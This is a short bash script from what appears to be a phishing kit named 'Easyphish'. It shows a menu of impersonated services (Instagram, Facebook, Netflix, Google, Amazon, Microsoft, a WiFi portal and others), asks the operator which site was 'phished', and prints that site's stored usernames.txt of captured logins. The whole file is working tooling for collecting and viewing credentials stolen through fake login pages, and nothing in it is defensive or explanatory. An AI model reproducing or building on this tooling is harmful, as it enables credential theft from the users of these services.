echo ""
echo -e "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m INSTAGRAM \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m FACEBOOK \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m NETFLIX \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m YAHOO \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m WIFI \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m GOOGLE \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m AMAZON \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m MICROSOFT \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m TWITTER \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m SHOPPING \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m EXIT \e[0m \n"
echo -e -n "\e[32mpls select which site you phished : "
read n

u()
{
cat usernames.txt
}

if [ $n = "1" ]
then
cd /$HOME/Easyphish/sites/instagram/
u
fi

if [ $n = "2" ]
then
cd /$HOME/Easyphish/sites/facebook/
u
fi

if [ $n = "3" ]
then
cd /$HOME/Easyphish/sites/netflix/
u
fi

if [ $n = "4" ]
then
cd /$HOME/Easyphish/sites/yahoo/
u
fi

if [ $n = "5" ]
then
cd /$HOME/Easyphish/sites/wifi/
u
fi

if [ $n = "6" ]
then
cd /$HOME/Easyphish/sites/google/
u
fi

if [ $n = "7" ]
then
cd /$HOME/Easyphish/sites/amazon/
u
fi

if [ $n = "8" ]
then
cd /$HOME/Easyphish/sites/microsoft/
u
fi

if [ $n = "9" ]
then
cd /$HOME/Easyphish/sites/twitter/
u
fi

if [ $n = "10" ]
then
cd /$HOME/Easyphish/sites/shopping/
u
fi

if [ $n = "11" ]
then
sleep 3.0
exit 0
fi

cd /$HOME/Easyphish/
bash results.sh
